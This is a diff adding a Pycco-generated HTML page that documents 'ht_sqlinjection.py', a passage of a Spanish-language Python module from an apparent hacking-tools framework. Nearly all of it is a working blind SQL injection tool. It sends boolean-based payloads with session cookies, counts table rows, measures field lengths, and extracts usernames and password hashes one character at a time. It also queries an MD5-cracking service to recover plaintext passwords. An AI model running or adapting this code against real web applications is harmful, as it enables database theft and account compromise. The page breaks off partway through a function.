@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <title>ht_sqlinjection.py</title>
+  <link rel="stylesheet" href="..\..\..\..\..\..\pycco.css">
+</head>
+<body>
+<div id='container'>
+  <div id="background"></div>
+  <div class='section'>
+    <div class='docs'><h1>ht_sqlinjection.py</h1></div>
+  </div>
+  <div class='clearall'>
+  <div class='section' id='section-0'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-0'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span> <span class="n">Fore</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="kn">from</span> <span class="nn">hackingtools.core</span> <span class="kn">import</span> <span class="n">Config</span><span class="p">,</span> <span class="n">Logger</span>
+<span class="kn">import</span> <span class="nn">hackingtools</span> <span class="kn">as</span> <span class="nn">ht</span>
+
+<span class="n">config</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="n">parentKey</span><span class="o">=</span><span class="s1">&#39;modules&#39;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s1">&#39;ht_sqlinjection&#39;</span><span class="p">)</span>
+<span class="n">config_dict</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="n">parentKey</span><span class="o">=</span><span class="s1">&#39;core&#39;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s1">&#39;utilities&#39;</span><span class="p">,</span> <span class="n">subkey</span><span class="o">=</span><span class="s1">&#39;dictionaries&#39;</span><span class="p">)</span>
+<span class="n">config_decrypt</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="n">parentKey</span><span class="o">=</span><span class="s1">&#39;core&#39;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s1">&#39;utilities&#39;</span><span class="p">,</span> <span class="n">subkey</span><span class="o">=</span><span class="s1">&#39;resources_cryptography_rest_api&#39;</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">cookie_session</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">param_focus</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">security</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="n">url_md5_decrypt</span> <span class="o">=</span> <span class="n">config_decrypt</span><span class="p">[</span><span class="s1">&#39;md5_decrypt&#39;</span><span class="p">]</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-1'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-1'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre><span class="k">class</span> <span class="nc">StartModule</span><span class="p">():</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-2'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-2'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">Logger</span><span class="o">.</span><span class="n">printMessage</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s1">&#39;ht_sqlinjection loaded&#39;</span><span class="p">,</span> <span class="n">debug_core</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="k">pass</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-3'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-3'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">help</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">Logger</span><span class="o">.</span><span class="n">printMessage</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">ht</span><span class="o">.</span><span class="n">getFunctionsNamesFromModule</span><span class="p">(</span><span class="s1">&#39;ht_sqlinjection&#39;</span><span class="p">))</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-4'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-4'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">setParams</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">param_focus</span><span class="p">,</span> <span class="n">cookie</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">submit_name</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">security</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">cookie_session</span> <span class="o">=</span> <span class="n">cookie</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">param_focus</span> <span class="o">=</span> <span class="n">param_focus</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">proxies</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">submit_name</span> <span class="o">=</span> <span class="n">submit_name</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">security</span> <span class="o">=</span> <span class="n">security</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-5'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-5'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">color</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">texto</span><span class="p">,</span> <span class="n">color</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s1">&#39;{iniColor}{texto}{finColor}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iniColor</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;Fore.{color}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">color</span><span class="o">=</span><span class="n">color</span><span class="p">)),</span> <span class="n">texto</span><span class="o">=</span><span class="n">texto</span><span class="p">,</span> <span class="n">finColor</span><span class="o">=</span><span class="n">Fore</span><span class="o">.</span><span class="n">WHITE</span><span class="p">)</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-6'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-6'>#</a>
+      </div>
+      <p>Esta funcion hay que sacarla a una llamada a un modulo de criptografria</p>
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">md5_decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">clave</span><span class="p">):</span>
+        <span class="n">clave_descifrada</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_md5_decrypt</span><span class="p">,</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="n">clave</span><span class="p">})</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">datos</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">datos</span><span class="p">:</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">clave_descifrada</span> <span class="ow">and</span> <span class="n">d</span> <span class="ow">in</span> <span class="s1">&#39;result&#39;</span><span class="p">:</span>
+                    <span class="n">actual</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+                    <span class="n">json_acceptable_string</span> <span class="o">=</span> <span class="n">actual</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>
+                    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_acceptable_string</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">d</span> <span class="ow">and</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]:</span>
+                            <span class="n">clave_descifrada</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">pass</span>
+        <span class="k">return</span> <span class="n">clave_descifrada</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-7'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-7'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">ejecutarSQL</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sqli</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span><span class="p">:</span>
+                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">submit_name</span><span class="p">:</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+                        <span class="n">url</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span>
+                        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">cookie_session</span><span class="p">,</span> <span class="s1">&#39;security&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">security</span><span class="p">},</span>
+                        <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span><span class="p">},</span>
+                        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">param_focus</span><span class="p">:</span> <span class="n">sqli</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">submit_name</span><span class="p">:</span> <span class="s1">&#39;Submit&#39;</span><span class="p">}</span>
+                    <span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+                        <span class="n">url</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span>
+                        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">cookie_session</span><span class="p">,</span> <span class="s1">&#39;security&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">security</span><span class="p">},</span>
+                        <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span><span class="p">},</span>
+                        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">param_focus</span><span class="p">:</span> <span class="n">sqli</span><span class="p">}</span>
+                    <span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">submit_name</span><span class="p">:</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+                        <span class="n">url</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span>
+                        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="bp">self</span><span class="o">.</span><span class="n">cookie_session</span><span class="p">,</span> <span class="s1">&#39;security&#39;</span><span class="p">:</span><span class="bp">self</span><span class="o">.</span><span class="n">security</span><span class="p">},</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-8'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-8'>#</a>
+      </div>
+      <p>proxies={&lsquo;http&rsquo;:&rsquo;http://127.0.0.1:8080/&rsquo;},</p>
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>                        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">param_focus</span><span class="p">:</span> <span class="n">sqli</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">submit_name</span><span class="p">:</span> <span class="s1">&#39;Submit&#39;</span><span class="p">}</span>
+                    <span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+                        <span class="n">url</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">,</span>
+                        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="bp">self</span><span class="o">.</span><span class="n">cookie_session</span><span class="p">,</span> <span class="s1">&#39;security&#39;</span><span class="p">:</span><span class="bp">self</span><span class="o">.</span><span class="n">security</span><span class="p">},</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-9'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-9'>#</a>
+      </div>
+      <p>proxies={&lsquo;http&rsquo;:&rsquo;http://127.0.0.1:8080/&rsquo;},</p>
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>                        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">param_focus</span><span class="p">:</span> <span class="n">sqli</span><span class="p">}</span>
+                    <span class="p">)</span>
+            <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="k">if</span> <span class="s1">&#39;ID exists&#39;</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="bp">True</span>
+                <span class="k">elif</span> <span class="s1">&#39;ID is MISSING&#39;</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="bp">False</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {mensaje} {sql}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Algo ha ido mal con tu sql&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span>  <span class="n">sql</span><span class="o">=</span><span class="n">sqli</span><span class="p">))</span>
+                    <span class="k">return</span> <span class="bp">False</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {mensaje} {url} - {sqli}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;URL mal formada...&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">url</span><span class="o">=</span><span class="n">result</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="n">sqli</span><span class="o">=</span><span class="n">sqli</span><span class="p">))</span>
+                <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {mensaje} {error}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Excepcion... Que ha pasado?&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">error</span><span class="o">=</span><span class="n">e</span><span class="p">))</span>
+            <span class="k">return</span> <span class="bp">False</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-10'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-10'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">cantidadTuplasEnTapla</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">campo</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100000</span><span class="p">):</span>
+            <span class="n">sentencia</span> <span class="o">=</span> <span class="s2">&quot;0 or {i} = (select count({campo}) from {tabla})&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">campo</span><span class="o">=</span><span class="n">campo</span><span class="p">,</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">)</span>
+            <span class="n">existe</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ejecutarSQL</span><span class="p">(</span><span class="n">sentencia</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">existe</span><span class="p">:</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
+                <span class="k">break</span>
+        <span class="k">return</span> <span class="n">result</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-11'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-11'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">longitudCampoIDtablaCampo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">campo</span><span class="p">,</span> <span class="n">campoConocido</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+            <span class="n">sentencia</span> <span class="o">=</span> <span class="s2">&quot;0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">campo</span><span class="o">=</span><span class="n">campo</span><span class="p">,</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="n">campoConocido</span><span class="o">=</span><span class="n">campoConocido</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-12'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-12'>#</a>
+      </div>
+      <p>print(sentencia)</p>
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>            <span class="n">existe</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ejecutarSQL</span><span class="p">(</span><span class="n">sentencia</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">existe</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="mi">2</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-13'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-13'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">cogerNombreDeTablaPorID</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">campoConocido</span><span class="p">):</span>
+        <span class="n">nombre</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+        <span class="n">cantidad</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">longitudCampoIDtablaCampo</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">campoConocido</span><span class="p">)</span>
+        <span class="n">abecedario</span> <span class="o">=</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;lalpha&#39;</span><span class="p">]</span>
+        <span class="k">if</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">user</span><span class="p">:</span>
+            <span class="n">abecedario</span> <span class="o">=</span> <span class="n">config_dict</span><span class="p">[</span><span class="s1">&#39;hex-lower&#39;</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">cantidad</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {titulo_tabla}: {tabla} {titulo_campo}: {campo} {titulo_longitud}: {cantidad} {campoConocido}: {id} {titulo_abecedario}: {abecedario}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="n">titulo_tabla</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Tabla&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="n">titulo_campo</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Campo&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="n">campo</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">titulo_longitud</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Longitud&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="n">cantidad</span><span class="o">=</span><span class="n">cantidad</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">campoConocido</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="n">campoConocido</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span> <span class="n">titulo_abecedario</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Abecedario&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_verbose&#39;</span><span class="p">]),</span> <span class="n">abecedario</span><span class="o">=</span><span class="n">abecedario</span><span class="p">))</span>
+            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">cantidad</span><span class="p">):</span> <span class="c1"># Longitud de dicho nombre de user</span>
+                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">abecedario</span><span class="p">)):</span>
+                    <span class="n">existe</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ejecutarSQL</span><span class="p">(</span><span class="s2">&quot;0 or exists(select {user} from {tabla} where user_id={id} and ASCII(substring({user}, {j}, 1))={i})&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span> <span class="n">j</span><span class="o">=</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="o">=</span><span class="nb">ord</span><span class="p">(</span><span class="n">abecedario</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span>
+                    <span class="k">if</span> <span class="n">existe</span><span class="p">:</span>
+                        <span class="n">nombre</span> <span class="o">=</span> <span class="s1">&#39;{nombre}{letra}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">nombre</span><span class="o">=</span><span class="n">nombre</span><span class="p">,</span> <span class="n">letra</span><span class="o">=</span><span class="n">abecedario</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+                        <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - La longitud del campo {campo} es {longitud}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">campo</span><span class="o">=</span><span class="n">campoConocido</span><span class="p">,</span> <span class="n">longitud</span><span class="o">=</span><span class="n">cantidad</span><span class="p">))</span>
